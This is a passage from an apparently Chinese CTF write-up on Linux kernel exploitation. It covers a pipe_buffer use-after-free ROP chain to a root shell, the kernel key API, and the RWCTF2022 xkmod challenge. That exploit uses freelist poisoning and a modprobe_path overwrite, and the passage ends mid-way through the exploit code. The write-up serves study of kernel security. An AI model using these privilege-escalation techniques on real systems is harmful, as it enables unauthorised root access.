class="literal">NULL</span>;</span><br><span class="line">    buf[<span class="number">9</span>] = kernel_offset + PREPARE_KERNEL_CRED;</span><br><span class="line">    buf[<span class="number">10</span>] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;</span><br><span class="line">    buf[<span class="number">11</span>] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    buf[<span class="number">12</span>] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x31</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = getRootShell;</span><br><span class="line">    buf[<span class="number">16</span>] = user_cs;</span><br><span class="line">    buf[<span class="number">17</span>] = user_rflags;</span><br><span class="line">    buf[<span class="number">18</span>] = user_sp + <span class="number">8</span>; <span class="comment">/* system() wants it : ( */</span></span><br><span class="line">    buf[<span class="number">19</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);<span class="comment">//uaf pipe_buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger pipe_buf_operations-&gt;release */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="kernel密钥管理接口"><a href="#kernel密钥管理接口" class="headerlink" title="kernel密钥管理接口"></a>kernel密钥管理接口</h3><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p><p>内核提供了两个系统调用来负责这些操作</p><p><code>add_key()</code>和<code>keyctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure><p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p><ul><li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li><li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li><li>释放 obj1 与 obj2，返回密钥 id</li></ul><p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p><p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p><p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p><p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p><p>当释放一个密钥时</p><p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><h1 id="RWCTF2022-高校赛-Digging-into-kernel-1-amp-2"><a href="#RWCTF2022-高校赛-Digging-into-kernel-1-amp-2" class="headerlink" title="RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2"></a>RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor null \</span><br><span class="line">    --nographic</span><br></pre></td></tr></table></figure><p>开启了smap,smep</p><p>又可以发现开启了kpti</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure><p>这个题目给的cpio中并没有init脚本</p><p>不过可以发现 <code>xkmod.ko</code> ，按照惯例这应当就是有漏洞的 LKM，拖入 IDA 进行分析。</p><p>在模块载入时会新建一个 kmem_cache 叫 <code>&quot;lalala&quot;</code>，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是 align(对齐),flags(标志位),ctor(构造函数)，由于没有设置 <code>SLAB_ACCOUNT</code> 标志位故该 <code>kmem_cache</code> <strong>会默认与 kmalloc-192 合并</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  kmem_cache *v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1E4);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v0 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v0;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的主要就是实现了ioctl,以及在关闭文件时会释放object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;v3, a3, <span class="number">16LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">107374182</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)v4, v3, (<span class="type">int</span>)v5);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">125269879</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">17895697</span> )</span><br><span class="line">          buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">3264LL</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_to_user(v3, (<span class="type">char</span> *)buf + (<span class="type">int</span>)v4);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 buf 是一个全局指针，我们可以注意到 ioctl 中所有的操作<strong>都没有上锁</strong>。</p><p>漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，<strong>只要我们同时打开多个设备文件便能完成 UAF</strong>。</p><p>需要的结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;data;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>首先因为uaf的存在,我们能够泄露一个object释放之后的内容</p><p>而kmem_cache的offset成员,决定了一个obj释放后的next指针位置</p><p>这里经过测试可以前八个字节就是一个内核地址,但是每次的页内偏移不同</p><p>由此可以知道</p><ol><li><code>offset==0</code></li><li>开启了RANDOM_FREELIST 保护</li><li>没有开启HARDENED_FREELIST保护</li></ol><p>freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，<strong>但是在后面的分配释放中依然遵循着后进先出的原则</strong>，因此我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配<strong>便能够成功获得目标地址上的 object ，实现任意地址读写</strong>。</p><p>但这么做有着一个小问题，当我们分配到目标地址时<strong>目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址</strong>，从而导致 kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 <strong>NULL 指针</strong>，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash。</p><h3 id="泄露基址"><a href="#泄露基址" class="headerlink" title="泄露基址"></a>泄露基址</h3><p>接下来我们考虑如何泄露内核基址，虽然题目新建的 <code>kmem_cache</code> 会默认与 <code>kmalloc-192</code> 合并，但为了还原出题人原始意图，我们还是将其当作一个独立的 <code>kmem_cache</code> 来完成利用。</p><p>在内核 “堆基址”（<code>page_offset_base</code>） + <code>0x9d000</code> 处存放着 <code>secondary_startup_64(0xffffffff81000030)</code> 函数的地址，而我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 <code>堆基址 + 0x9d000</code> 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。</p><p>若是没有猜中，笔者认为直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的 double free 检测，不过经笔者测验大部分情况下都能够猜中堆基址。</p><h3 id="修改modprobe-path以root执行程序"><a href="#修改modprobe-path以root执行程序" class="headerlink" title="修改modprobe_path以root执行程序"></a>修改modprobe_path以root执行程序</h3><p>接下来我们考虑如何通过任意地址写完成利用，比较常规的做法是覆写内核中的一些全局的可写的函数表（例如 <code>n_tty_ops</code>）来劫持内核执行流，这里选择覆写 <code>modprobe_path</code> 从而以 root 执行程序。</p><p>当我们尝试去执行(execve)一个非法的文件(file magic not found,即文件格式头错误)，内核会经历如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() // wrapped as request_module</span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure><p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码（以下来着内核源码 5.14）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    argv[<span class="number">0</span>] = modprobe_path;<span class="comment">//argv[0]即运行程序名</span></span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = module_name;  <span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!info)</span><br><span class="line">        <span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为<code>/sbin/modprobe</code>。</p><p>我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，<strong>内核将会以 root 权限执行我们的恶意脚本</strong>。</p><p>modprobe_path的地址可以由符号名直接搜索到</p><p>但是有些vmlinux似乎去除了这个符号</p><p>这个时候就可以通过搜索modprobe_path的初始符号值<code>/sbin/modprobe</code>寻找</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-27_230748.png" alt=""></p><p>例如本题最终底下那个就是modprobe的地址,最顶上那个对应直接映射区</p><p>又或者在<code>/proc/kallsyms</code>文件夹下找</p><p><code>grep modprobe_path /proc/kallsyms</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>流程就是利用uaf写一个obj的next指针</p><p>首先泄露page_offset_base进而再次泄露page_offset_base+0x9d000处的内核函数指针</p><p>从而得到内核映射基址</p><p>然后uaf写modprobe_path为创建的利用程序路径</p><p>最后打开一个非法文件触发利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH  <span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bindCore</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">allocBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> dev_fd[<span class="number">5</span>], root_script_fd, flag_fd;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak, kernel_text_leak;</span><br><span class="line">    <span class="type">size_t</span> kernel_base, kernel_offset, page_offset_base;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        dev_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create fake modprobe_path file */</span></span><br><span class="line">    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">    write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">    close(root_script_fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x &quot;</span> 